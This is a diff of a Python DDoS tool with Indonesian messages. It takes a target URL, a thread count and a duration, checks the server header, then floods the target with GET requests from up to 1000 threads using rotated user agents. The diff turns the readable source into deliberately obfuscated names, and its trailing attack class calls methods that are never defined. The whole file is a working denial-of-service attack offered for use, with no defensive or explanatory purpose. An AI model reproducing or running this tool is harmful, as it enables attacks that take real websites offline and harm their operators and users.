@@ -1,140 +1,111 @@
-import requests
-import threading
-import time
-import random
+lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII = Exception, int, range, bool, input, ValueError, print, str
 
-# Fungsi untuk mendeteksi jenis web server
-def detect_web_server(url):
+from requests import head as IIllIIIlIIIIll, Timeout as llllIIlIlIlllI, Session as IIllllIIIIIIIl, get as IlIIIIIIlIIIll, ConnectionError as llllllllIlIllI
+from time import time as IIIIIllIIIIllI
+from random import choice as llIlIIIIIlIIll
+from threading import Thread as IllIlIIllIlIII
+
+def IIIlIlIlllIllIIllI(IlIlllIIlllIIIIIII):
     try:
-        # Tambahkan timeout untuk mencegah hanging
-        response = requests.head(url, timeout=5)
-        server_header = response.headers.get("Server", "Tidak Terdeteksi")
-        print(f"Jenis Web Server yang terdeteksi: {server_header}")
-        return server_header
-    except requests.Timeout:
-        print("Timeout: Server tidak merespons dalam waktu yang ditentukan")
-        return None
-    except requests.ConnectionError:
-        print("Koneksi gagal: Tidak dapat terhubung ke server")
-        return None
-    except Exception as e:
-        print(f"Error tidak terduga: {str(e)}")
-        return None
+        IIIIIlllIIIIIllllI = IIllIIIlIIIIll(IlIlllIIlllIIIIIII, timeout=5)
+        lIllIlIllIlIIIIlll = IIIIIlllIIIIIllllI.headers.get('Server', 'Tidak Terdeteksi')
+        llllllllllllIIl(f'Jenis Web Server yang terdeteksi: {lIllIlIllIlIIIIlll}')
+        return lIllIlIllIlIIIIlll
+    except llllIIlIlIlllI:
+        llllllllllllIIl('Timeout: Server tidak merespons dalam waktu yang ditentukan')
+        return
+    except llllllllIlIllI:
+        llllllllllllIIl('Koneksi gagal: Tidak dapat terhubung ke server')
+        return
+    except lllllllllllllll as IIlIIllIIllllIIlll:
+        llllllllllllIIl(f'Error tidak terduga: {llllllllllllIII(IIlIIllIIllllIIlll)}')
+        return
 
-# Fungsi untuk mengonfirmasi dari pengguna apakah akan melanjutkan serangan
-def prompt_user(server_type):
-    response = input(f"Web server terdeteksi sebagai {server_type}. Lanjutkan serangan DDoS? (y/n): ")
-    return response.lower() == 'y'
+def lllllllIlllIIlIlll(lIlIlIllllIllIlIll):
+    lIllIlIllIlIIIIlll = llllllllllllIll(f'Web server terdeteksi sebagai {lIlIlIllllIllIlIll}. Lanjutkan serangan DDoS? (y/n): ')
+    return lIllIlIllIlIIIIlll.lower() == 'y'
 
-# Fungsi untuk menjalankan serangan DDoS dengan logika khusus berdasarkan jenis server dan durasi serangan
-def perform_ddos_attack(url, server_type, num_threads, attack_duration):
-    end_time = time.time() + attack_duration  # Hitung waktu akhir serangan
+def llIIllIlIIIllllIII(IlIlllIIlllIIIIIII, lIlIlIllllIllIlIll, IIllllIIIIllIIlIlI, IIIllIlIlIIIlIIllI):
+    IIlIIllIIllllIIlll = IIIIIllIIIIllI() + IIIllIlIlIIIlIIllI
+    IIlIIIlIlllIllIlll = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)', 'Mozilla/5.0 (Android 10; Mobile; rv:68.0)']
 
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
-        "Mozilla/5.0 (Android 10; Mobile; rv:68.0)"
-    ]
-    
-    def send_request():
-        while time.time() < end_time:
+    def IIIIIllIlllIIIlIII():
+        while IIIIIllIIIIllI() < IIlIIllIIllllIIlll:
             try:
-                headers = {
-                    "User-Agent": random.choice(user_agents),
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language": "en-US,en;q=0.5",
-                    "Accept-Encoding": "gzip, deflate",
-                    "Connection": "keep-alive"
-                }
-                response = requests.get(url, headers=headers, timeout=5)
-                print(f"Status: {response.status_code}")
-            except Exception as e:
-                print(f"Request gagal: {str(e)}")
+                lIllIlIllIlIIIIlll = {'User-Agent': llIlIIIIIlIIll(IIlIIIlIlllIllIlll), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive'}
+                IIIIIlllIIIIIllllI = IlIIIIIIlIIIll(IlIlllIIlllIIIIIII, headers=lIllIlIllIlIIIIlll, timeout=5)
+                llllllllllllIIl(f'Status: {IIIIIlllIIIIIllllI.status_code}')
+            except lllllllllllllll as IIIIIllIlllIIIlIII:
+                llllllllllllIIl(f'Request gagal: {llllllllllllIII(IIIIIllIlllIIIlIII)}')
+    IIIIIlllIIIIIllllI = []
+    for IlIIlllIlIlIIIIlIl in lllllllllllllIl(IIllllIIIIllIIlIlI):
+        lIllIlIllIlIIIIlll = IllIlIIllIlIII(target=IIIIIllIlllIIIlIII)
+        IIIIIlllIIIIIllllI.append(lIllIlIllIlIIIIlll)
+        lIllIlIllIlIIIIlll.start()
+    for lIllIlIllIlIIIIlll in IIIIIlllIIIIIllllI:
+        lIllIlIllIlIIIIlll.join()
 
-    # Mulai serangan DDoS dengan jumlah thread yang ditentukan pengguna
-    threads = []
-    for i in range(num_threads):
-        thread = threading.Thread(target=send_request)
-        threads.append(thread)
-        thread.start()
-
-    # Tunggu semua thread selesai
-    for thread in threads:
-        thread.join()
-
-# Fungsi untuk validasi input
-def validate_input():
-    while True:
+def lIIIIIIlIllIIIllII():
+    while lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1):
         try:
-            url = input("Masukkan URL target: ")
-            if not url.startswith(('http://', 'https://')):
-                print("URL harus dimulai dengan http:// atau https://")
+            lIllIlIllIlIIIIlll = llllllllllllIll('Masukkan URL target: ')
+            if not lIllIlIllIlIIIIlll.startswith(('http://', 'https://')):
+                llllllllllllIIl('URL harus dimulai dengan http:// atau https://')
                 continue
-                
-            num_threads = int(input("Masukkan jumlah thread (1-1000): "))
-            if not 1 <= num_threads <= 1000:
-                print("Jumlah thread harus antara 1-1000")
+            IIIIIlllIIIIIllllI = llllllllllllllI(llllllllllllIll('Masukkan jumlah thread (1-1000): '))
+            if not 1 <= IIIIIlllIIIIIllllI <= 1000:
+                llllllllllllIIl('Jumlah thread harus antara 1-1000')
                 continue
-                
-            attack_duration = int(input("Masukkan durasi waktu serangan dalam detik (1-3600): "))
-            if not 1 <= attack_duration <= 3600:
-                print("Durasi harus antara 1-3600 detik")
+            IIlIIllIIllllIIlll = llllllllllllllI(llllllllllllIll('Masukkan durasi waktu serangan dalam detik (1-3600): '))
+            if not 1 <= IIlIIllIIllllIIlll <= 3600:
+                llllllllllllIIl('Durasi harus antara 1-3600 detik')
                 continue
-                
-            return url, num_threads, attack_duration
-        except ValueError:
-            print("Input tidak valid. Mohon masukkan angka untuk thread dan durasi.")
-
-# Prompt untuk input URL, jumlah thread, dan durasi waktu dari pengguna
-url, num_threads, attack_duration = validate_input()
-
-# Jalankan deteksi server dan mulai proses serangan
-server_type = detect_web_server(url)
-if server_type:
-    if prompt_user(server_type):
-        print(f"Memulai serangan DDoS ke server jenis {server_type} pada {url} dengan {num_threads} thread selama {attack_duration} detik...")
-        perform_ddos_attack(url, server_type, num_threads, attack_duration)
+            return (lIllIlIllIlIIIIlll, IIIIIlllIIIIIllllI, IIlIIllIIllllIIlll)
+        except llllllllllllIlI:
+            llllllllllllIIl('Input tidak valid. Mohon masukkan angka untuk thread dan durasi.')
+(IlIlllIIlllIIIIIII, IIllllIIIIllIIlIlI, IIIllIlIlIIIlIIllI) = lIIIIIIlIllIIIllII()
+lIlIlIllllIllIlIll = IIIlIlIlllIllIIllI(IlIlllIIlllIIIIIII)
+if lIlIlIllllIllIlIll:
+    if lllllllIlllIIlIlll(lIlIlIllllIllIlIll):
+        llllllllllllIIl(f'Memulai serangan DDoS ke server jenis {lIlIlIllllIllIlIll} pada {IlIlllIIlllIIIIIII} dengan {IIllllIIIIllIIlIlI} thread selama {IIIllIlIlIIIlIIllI} detik...')
+        llIIllIlIIIllllIII(IlIlllIIlllIIIIIII, lIlIlIllllIllIlIll, IIllllIIIIllIIlIlI, IIIllIlIlIIIlIIllI)
     else:
-        print("Serangan dibatalkan oleh pengguna.")
+        llllllllllllIIl('Serangan dibatalkan oleh pengguna.')
 else:
-    print("Gagal mendeteksi jenis web server. Tidak dapat melanjutkan serangan.")
+    llllllllllllIIl('Gagal mendeteksi jenis web server. Tidak dapat melanjutkan serangan.')
 
-class DDoSAttack:
-    def __init__(self, url, threads, duration):
-        self.url = url
-        self.threads = threads
-        self.duration = duration
-        self.session = requests.Session()
-        self.start_time = None
-        self.end_time = None
-        
-    def setup(self):
-        self.server_type = self.detect_web_server()
-        if not self.server_type:
-            return False
-        return True
-        
-    def run(self):
-        if not self.setup():
+class lIIIlIlIlIlIllllll:
+
+    def __init__(lIllIlIllIlIIIIlll, IlIlllIIlllIIIIIII, llIIllIIIIIIllIIIl, IlllllllIIlIlIlIII):
+        lIllIlIllIlIIIIlll.IlIlllIIlllIIIIIII = IlIlllIIlllIIIIIII
+        lIllIlIllIlIIIIlll.llIIllIIIIIIllIIIl = llIIllIIIIIIllIIIl
+        lIllIlIllIlIIIIlll.IlllllllIIlIlIlIII = IlllllllIIlIlIlIII
+        lIllIlIllIlIIIIlll.session = IIllllIIIIIIIl()
+        lIllIlIllIlIIIIlll.start_time = None
+        lIllIlIllIlIIIIlll.end_time = None
+
+    def lllllIIlIIlIIlllII(lIllIlIllIlIIIIlll):
+        lIllIlIllIlIIIIlll.lIlIlIllllIllIlIll = lIllIlIllIlIIIIlll.IIIlIlIlllIllIIllI()
+        if not lIllIlIllIlIIIIlll.lIlIlIllllIllIlIll:
+            return lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)
+        return lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)
+
+    def IlIIlllllIlllIllIl(lIllIlIllIlIIIIlll):
+        if not lIllIlIllIlIIIIlll.lllllIIlIIlIIlllII():
             return
-        
-        self.start_time = time.time()
-        self.end_time = self.start_time + self.duration
-        
-        threads = []
-        for _ in range(self.threads):
-            t = threading.Thread(target=self._attack_worker)
-            threads.append(t)
-            t.start()
-            
-        for t in threads:
-            t.join()
-            
-    def _attack_worker(self):
-        while time.time() < self.end_time:
+        lIllIlIllIlIIIIlll.start_time = IIIIIllIIIIllI()
+        lIllIlIllIlIIIIlll.end_time = lIllIlIllIlIIIIlll.start_time + lIllIlIllIlIIIIlll.IlllllllIIlIlIlIII
+        IIlIIllIIllllIIlll = []
+        for IIlIIIlIlllIllIlll in lllllllllllllIl(lIllIlIllIlIIIIlll.llIIllIIIIIIllIIIl):
+            IIIIIlllIIIIIllllI = IllIlIIllIlIII(target=lIllIlIllIlIIIIlll.lIlIIIllIIIIlIIIlI)
+            IIlIIllIIllllIIlll.append(IIIIIlllIIIIIllllI)
+            IIIIIlllIIIIIllllI.start()
+        for IIIIIlllIIIIIllllI in IIlIIllIIllllIIlll:
+            IIIIIlllIIIIIllllI.join()
+
+    def lIlIIIllIIIIlIIIlI(lIllIlIllIlIIIIlll):
+        while IIIIIllIIIIllI() < lIllIlIllIlIIIIlll.end_time:
             try:
-                self._send_request()
-            except Exception as e:
-                self._handle_error(e)
+                lIllIlIllIlIIIIlll._send_request()
+            except lllllllllllllll as IIIIIlllIIIIIllllI:
+                lIllIlIllIlIIIIlll._handle_error(IIIIIlllIIIIIllllI)
